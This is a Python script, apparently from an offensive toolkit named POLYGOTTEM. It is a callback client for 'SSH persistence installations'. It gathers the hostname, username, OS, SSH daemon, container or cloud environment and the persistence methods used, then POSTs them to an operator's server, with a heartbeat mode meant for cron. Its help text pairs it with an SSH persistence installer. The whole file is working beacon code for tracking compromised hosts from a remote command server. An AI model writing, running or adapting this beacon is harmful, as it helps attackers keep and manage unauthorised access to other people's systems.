#!/usr/bin/env python3
"""
POLYGOTTEM SSH Callback Client
================================
Client script to send callbacks from SSH persistence installations

Usage:
    # Basic callback
    python3 client_callback.py --server https://your-vps.com:5000 --api-key YOUR_KEY

    # With auto-detection
    python3 client_callback.py --server https://your-vps.com:5000 --api-key YOUR_KEY --auto-detect

    # Heartbeat mode (for cron)
    python3 client_callback.py --server https://your-vps.com:5000 --api-key YOUR_KEY --heartbeat

Author: SWORDIntel
Date: 2025-11-18
"""

import sys
import json
import socket
import platform
import subprocess
import argparse
from pathlib import Path
from datetime import datetime

# Try to import requests, fallback to urllib
try:
    import requests
    USE_REQUESTS = True
except ImportError:
    import urllib.request
    import urllib.parse
    USE_REQUESTS = False


def get_hostname():
    """Get system hostname"""
    try:
        return socket.gethostname()
    except:
        return "unknown"


def get_username():
    """Get current username"""
    try:
        import os
        return os.getenv('USER') or os.getenv('USERNAME') or 'unknown'
    except:
        return "unknown"


def detect_environment():
    """Detect environment information"""
    env_data = {
        'hostname': get_hostname(),
        'username': get_username(),
        'ssh_port': 22,  # Default, override if needed
        'os_type': 'unknown',
        'os_version': 'unknown',
        'architecture': platform.machine(),
        'environment': 'unknown',
        'init_system': 'unknown',
        'ssh_implementation': 'unknown',
        'persistence_methods': []
    }

    # Detect OS
    system = platform.system().lower()
    if 'linux' in system:
        env_data['os_type'] = 'linux'
        env_data['os_version'] = platform.version()

        # Detect distribution
        if Path('/etc/os-release').exists():
            try:
                with open('/etc/os-release') as f:
                    for line in f:
                        if line.startswith('PRETTY_NAME='):
                            env_data['os_version'] = line.split('=')[1].strip('"\'')
                            break
            except:
                pass

        # Detect init system
        if Path('/run/systemd/system').exists():
            env_data['init_system'] = 'systemd'
        elif Path('/sbin/openrc').exists():
            env_data['init_system'] = 'openrc'
        elif Path('/run/runit').exists():
            env_data['init_system'] = 'runit'

        # Detect SSH implementation
        if Path('/usr/sbin/sshd').exists():
            env_data['ssh_implementation'] = 'openssh'
        elif Path('/usr/sbin/dropbear').exists():
            env_data['ssh_implementation'] = 'dropbear'

        # Detect environment type
        if Path('/.dockerenv').exists():
            env_data['environment'] = 'docker'
        elif Path('/proc/1/cgroup').exists():
            try:
                with open('/proc/1/cgroup') as f:
                    content = f.read()
                    if 'docker' in content:
                        env_data['environment'] = 'docker'
                    elif 'lxc' in content:
                        env_data['environment'] = 'lxc'
            except:
                pass

        # Check for cloud
        if Path('/sys/hypervisor/uuid').exists():
            try:
                with open('/sys/hypervisor/uuid') as f:
                    if 'ec2' in f.read().lower():
                        env_data['environment'] = 'aws_ec2'
            except:
                pass

    elif 'windows' in system:
        env_data['os_type'] = 'windows'
        env_data['os_version'] = platform.version()
        env_data['init_system'] = 'windows_service'

        # Check for OpenSSH
        if Path(r'C:\Windows\System32\OpenSSH\sshd.exe').exists():
            env_data['ssh_implementation'] = 'openssh_windows'

    elif 'darwin' in system:
        env_data['os_type'] = 'macos'
        env_data['os_version'] = platform.mac_ver()[0]
        env_data['init_system'] = 'launchd'

    return env_data


def send_callback_requests(server_url, api_key, env_data):
    """Send callback using requests library"""
    url = f"{server_url}/api/register"

    payload = {
        'api_key': api_key,
        **env_data
    }

    try:
        response = requests.post(url, json=payload, timeout=30, verify=True)
        return response.status_code, response.json()
    except Exception as e:
        return None, {'status': 'error', 'message': str(e)}


def send_callback_urllib(server_url, api_key, env_data):
    """Send callback using urllib (fallback)"""
    url = f"{server_url}/api/register"

    payload = {
        'api_key': api_key,
        **env_data
    }

    data = json.dumps(payload).encode('utf-8')
    req = urllib.request.Request(
        url,
        data=data,
        headers={'Content-Type': 'application/json'}
    )

    try:
        response = urllib.request.urlopen(req, timeout=30)
        status_code = response.getcode()
        response_data = json.loads(response.read().decode('utf-8'))
        return status_code, response_data
    except Exception as e:
        return None, {'status': 'error', 'message': str(e)}


def send_heartbeat_requests(server_url, api_key, hostname):
    """Send heartbeat using requests library"""
    url = f"{server_url}/api/heartbeat"

    payload = {
        'api_key': api_key,
        'hostname': hostname
    }

    try:
        response = requests.post(url, json=payload, timeout=30, verify=True)
        return response.status_code, response.json()
    except Exception as e:
        return None, {'status': 'error', 'message': str(e)}


def send_heartbeat_urllib(server_url, api_key, hostname):
    """Send heartbeat using urllib (fallback)"""
    url = f"{server_url}/api/heartbeat"

    payload = {
        'api_key': api_key,
        'hostname': hostname
    }

    data = json.dumps(payload).encode('utf-8')
    req = urllib.request.Request(
        url,
        data=data,
        headers={'Content-Type': 'application/json'}
    )

    try:
        response = urllib.request.urlopen(req, timeout=30)
        status_code = response.getcode()
        response_data = json.loads(response.read().decode('utf-8'))
        return status_code, response_data
    except Exception as e:
        return None, {'status': 'error', 'message': str(e)}


def main():
    parser = argparse.ArgumentParser(
        description='POLYGOTTEM SSH Callback Client',
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Examples:
  # Send callback with auto-detection
  python3 client_callback.py --server https://vps.example.com:5000 --api-key abc123 --auto-detect

  # Send callback with manual data
  python3 client_callback.py --server https://vps.example.com:5000 --api-key abc123 \\
      --hostname myserver --os-type linux --ssh-port 22

  # Send heartbeat (for periodic checks)
  python3 client_callback.py --server https://vps.example.com:5000 --api-key abc123 --heartbeat

  # Use with SSH persistence module
  python3 ssh_persistence_linux_enhanced.py --install-all --callback-server https://vps.example.com:5000 --callback-api-key abc123
        """
    )

    parser.add_argument('--server', required=True, help='Callback server URL (e.g., https://vps.example.com:5000)')
    parser.add_argument('--api-key', required=True, help='API key for authentication')
    parser.add_argument('--auto-detect', action='store_true', help='Auto-detect environment')
    parser.add_argument('--heartbeat', action='store_true', help='Send heartbeat instead of full callback')

    # Manual environment data
    parser.add_argument('--hostname', help='Hostname')
    parser.add_argument('--username', help='Username')
    parser.add_argument('--ssh-port', type=int, default=22, help='SSH port')
    parser.add_argument('--os-type', help='OS type (linux/windows/macos)')
    parser.add_argument('--os-version', help='OS version')
    parser.add_argument('--architecture', help='Architecture')
    parser.add_argument('--environment', help='Environment type')
    parser.add_argument('--init-system', help='Init system')
    parser.add_argument('--ssh-implementation', help='SSH implementation')
    parser.add_argument('--persistence-methods', nargs='+', help='Persistence methods used')

    args = parser.parse_args()

    # Heartbeat mode
    if args.heartbeat:
        hostname = args.hostname or get_hostname()
        print(f"[*] Sending heartbeat for {hostname}...")

        if USE_REQUESTS:
            status_code, response_data = send_heartbeat_requests(args.server, args.api_key, hostname)
        else:
            status_code, response_data = send_heartbeat_urllib(args.server, args.api_key, hostname)

        if status_code == 200:
            print(f"[+] Heartbeat sent successfully")
            print(f"[*] Response: {response_data.get('message')}")
            return 0
        else:
            print(f"[!] Failed to send heartbeat: {response_data.get('message')}")
            return 1

    # Full callback mode
    if args.auto_detect:
        print("[*] Auto-detecting environment...")
        env_data = detect_environment()
        print(f"[+] Detected: {env_data['os_type']} {env_data['os_version']}")
    else:
        # Use manual data
        env_data = {
            'hostname': args.hostname or get_hostname(),
            'username': args.username or get_username(),
            'ssh_port': args.ssh_port,
            'os_type': args.os_type or 'unknown',
            'os_version': args.os_version or 'unknown',
            'architecture': args.architecture or platform.machine(),
            'environment': args.environment or 'unknown',
            'init_system': args.init_system or 'unknown',
            'ssh_implementation': args.ssh_implementation or 'unknown',
            'persistence_methods': args.persistence_methods or []
        }

    print(f"[*] Sending callback to {args.server}...")

    if USE_REQUESTS:
        status_code, response_data = send_callback_requests(args.server, args.api_key, env_data)
    else:
        status_code, response_data = send_callback_urllib(args.server, args.api_key, env_data)

    if status_code == 200:
        print(f"[+] Callback registered successfully")
        print(f"[*] Callback ID: {response_data.get('callback_id')}")
        print(f"[*] Timestamp: {response_data.get('timestamp')}")
        return 0
    else:
        print(f"[!] Failed to register callback: {response_data.get('message')}")
        return 1


if __name__ == '__main__':
    try:
        sys.exit(main())
    except KeyboardInterrupt:
        print("\n[!] Interrupted")
        sys.exit(130)
    except Exception as e:
        print(f"\n[!] Error: {e}")
        sys.exit(1)
